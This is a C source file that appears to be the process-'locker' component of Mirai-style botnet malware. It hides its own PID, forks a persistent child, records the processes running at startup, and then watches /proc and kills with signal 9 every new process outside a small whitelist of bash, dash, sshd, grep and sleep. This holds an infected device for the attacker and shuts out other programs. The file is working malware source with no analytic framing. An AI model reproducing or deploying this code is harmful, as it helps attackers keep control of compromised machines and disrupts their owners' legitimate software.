#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <signal.h>
#include <stdlib.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/limits.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

#include "headers/util.h"
#include "headers/includes.h"
#include "headers/locker.h"

locker* root = NULL;
char killer_realpath[PATH_MAX] = {0};
 
BOOL exe_access(void) {
    char path[PATH_MAX] = {0}, tmp[16];
    int fd, k_rp_len;
    char x[16];

    util_itoa(getpid(), 10, x);
    util_strcat(path, "/proc/");
    util_strcat(path, x);
    util_strcat(path, "/exe");

    if ((fd = open(path, O_RDONLY)) == -1) {

        #ifdef DEBUG
        printf("Failed to open path : %s\n", path);
        #endif

        return FALSE;
    }

    close(fd);

    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX -1)) != -1) {
        killer_realpath[k_rp_len] = 0;
        
        #ifdef DEBUG
        printf("Running out of \"%s\"\n", killer_realpath);
        #endif

    }
    _memset(path, 0, sizeof(path));
    return TRUE;
}

BOOL locker_find(locker* root, int pid) {
    if (root == NULL) return FALSE;

    if (root->pro_id == pid) return TRUE;

    if (pid < root->pro_id) return locker_find(root->left, pid);

    else return locker_find(root->right, pid);

}

locker* locker_insert(locker** rootptr, int pid) {
    locker* root = *rootptr;

    if (root == NULL) {

        *rootptr = calloc(1, sizeof(locker));
        (*rootptr)->pro_id = pid;
        return NULL;
    }

    if (pid < root->pro_id) return locker_insert(&(root->left), pid);

    else return locker_insert(&(root->right), pid);
}

locker* locker_getpids(void) {
    locker* root = calloc(1, sizeof(locker));

    struct dirent *file;

    DIR *dir = opendir("/proc/");
    while ((file = readdir(dir)) != NULL) {
        if (*(file->d_name) < '0' || *(file->d_name) > '9') continue;

        locker_insert(&root, atoi(file->d_name));
    }
    closedir(dir);
    return root;
}

void check_proc(locker* root) {
    struct dirent* file;

    DIR* dir;
    int i_pid, rp_len;
    char realpath[PATH_MAX] = {0}, exe[PATH_MAX] = {0};

    dir = opendir("/proc/");

    if (dir == NULL) {
        return;
    }

    while((file = readdir(dir)) != NULL) {
        _memset(realpath, 0, sizeof(realpath));
        _memset(exe, 0, sizeof(realpath));

        util_strcpy(realpath, "/proc/");
        util_strcat(realpath, (file->d_name));
        util_strcat(realpath, "/exe");

        if ((rp_len = readlink(realpath, exe, PATH_MAX)) == -1)
            continue;

        realpath[0] = 0;

        if (*(file->d_name) < '0' || *(file->d_name) > '9' || (i_pid = atoi(file->d_name)) == getpid() || i_pid == getppid() || util_strcmp(exe, killer_realpath))
            continue;

        if (!locker_find(root, i_pid)) {
            if (strstr(exe, "/usr/bin/bash") == NULL &&
                strstr(exe, "/usr/bin/dash") == NULL &&
                strstr(exe, "/usr/sbin/sshd") == NULL &&
                strstr(exe, "/usr/bin/grep") == NULL &&
                strstr(exe, "/usr/bin/sleep") == NULL) {
                
                #ifdef DEBUG
                    printf("[locker] killing process: %d, %s\n", i_pid, exe);
                #endif
                 
                kill(i_pid, 9);
            }
            else {

                #ifdef DEBUG
                printf("[locker] whitelisted process: %d, %s\n", i_pid, exe);
                #endif
            }
        }
    }
}
 
void locker_init(int pipe[2]) {
 
    hidepid(getpid());
    int pid = fork();

    if (pid != 0)
        return;

	close(pipe[0]); 

	int locker_pid = getpid();
	write(pipe[1], &locker_pid, sizeof(locker_pid));

	close(pipe[1]);

    struct stat loock;
    long unsigned int flux = 0;
    root = locker_getpids();
    if (!exe_access()) {

        return;
    }

    while (1) {

        if (stat("/proc/", &loock) == -1) {

			return;
		}

        if (!flux) {
            flux = (long unsigned int)loock.st_nlink;
            continue;
        }

        if (flux < (uintmax_t)loock.st_nlink)
            check_proc(root);

        flux = loock.st_nlink;
        sleep(1);
    }
}
